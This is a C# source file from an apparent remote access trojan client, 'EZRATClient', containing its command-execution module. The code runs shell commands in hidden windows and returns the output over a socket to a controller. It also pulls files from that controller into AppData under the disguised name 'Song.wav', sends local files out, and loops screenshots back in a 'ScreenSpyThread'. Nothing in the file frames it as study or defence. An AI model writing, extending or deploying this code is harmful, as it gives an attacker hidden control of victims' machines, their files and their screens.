using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using EZRATClient.Utils;
using System.Threading;
using System.Drawing.Imaging;
using System.Net.Sockets;

namespace EZRATClient.Core
{
    public static class CommandExecutor
    {
        public static void ExecuteCommand(string command, string path = "C:\\")
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);

            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            procStartInfo.WorkingDirectory = path;
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();
            string result = proc.StandardOutput.ReadToEnd();
            Program.SendCommand("cmd;" + path + ";" + result);
        }



        public static void ReceiveFile(string path)
        {
            if (path == "" || path == null)
            {
                path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Song.wav";
            }
            int size = 1024;
            long sizeFile = 0, tot = 0;
            FileStream fs = new FileStream(path, FileMode.Create);
            NetworkStream ns = new NetworkStream(Program._clientSocket);
            try
            {
                byte[] data = new byte[size];
                bool loop_break = true;
                ns.ReadTimeout = 2000;
                do
                {
                    int nb = ns.Read(data, 0, size);
                    fs.Write(data, 0, nb);
                    fs.Flush();
                    tot += (uint)nb;
                    if (nb == -1)
                    {
                        loop_break = false;
                    }
                } while (loop_break);
            }
            catch (IOException ex)
            {
                Console.WriteLine($"Total data write : {tot}");
                fs.Close();
                ns.Close();
                Program.SendCommand("upfilestop;");
                return;
            }
        }


        private static byte[] CreateDataPacket(byte[] cmd, byte[] data)
        {
            byte[] initialize = new byte[1];
            initialize[0] = 2;
            byte[] separator = new byte[1];
            separator[0] = 4;
            byte[] datalength = Encoding.UTF8.GetBytes(Convert.ToString(data.Length));
            MemoryStream ms = new MemoryStream();
            ms.Write(initialize, 0, initialize.Length);
            ms.Write(cmd, 0, cmd.Length);
            ms.Write(datalength, 0, datalength.Length);
            ms.Write(separator, 0, separator.Length);
            ms.Write(data, 0, data.Length);
            return ms.ToArray();
        }

        public static byte[] ReadStream(NetworkStream ns)
        {
            byte[] data_buff = null;

            int b = 0;
            String buff_length = "";
            while ((b = ns.ReadByte()) != 4)
            {
                buff_length += (char)b;
            }
            int data_length = Convert.ToInt32(buff_length);
            data_buff = new byte[data_length];
            int byte_read = 0;
            int byte_offset = 0;
            while (byte_offset < data_length)
            {
                byte_read = ns.Read(data_buff, byte_offset, data_length - byte_offset);
                byte_offset += byte_read;
            }

            return data_buff;
        }

        public static void SendFile(string path)
        {
            if (!Program._clientSocket.Connected) //If the client isn't connected
            {
                Console.WriteLine("Socket is not connected!");
                return; //Return
            }


            string file_name = Path.GetFileName(path);
            int size = 1024;
            uint tot = 0;
            FileStream fs = new FileStream(path, FileMode.Open);
            NetworkStream ns = new NetworkStream(Program._clientSocket);
            byte[] data = new byte[size];
            while (tot < fs.Length)
            {
                fs.Read(data, 0, size);
                tot += (uint)data.Length;
                ns.Write(data, 0, size);
            }
            Console.WriteLine($"Total data : {tot}");
            fs.Close();
        }

        public static void WindowsControl(string command)
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);
            procStartInfo.RedirectStandardOutput = false;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();
        }


        // For futur use
        public static Thread ScreenSpyThread()
        {
            Constantes.Spy = new Thread(() =>
           {
               while (true)
               {
                   string tmp = "screenspy;" + TakeScreenShot();
                   Program.SendCommand(tmp);
                   Thread.Sleep(Constantes.ScreenShotSpeed);
               }
           });
            Constantes.Spy.Start();
            return Constantes.Spy;
        }

        public static void StopScreenSpyThread()
        {
            Constantes.Spy.Abort();
        }

        public static string TakeScreenShot()
        {
            string result = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ScreenUtils.ScreenShot().Save(ms, ImageFormat.Png);
                result = Encoding.Default.GetString(ms.ToArray());
            }
            return result;
        }


    }
}
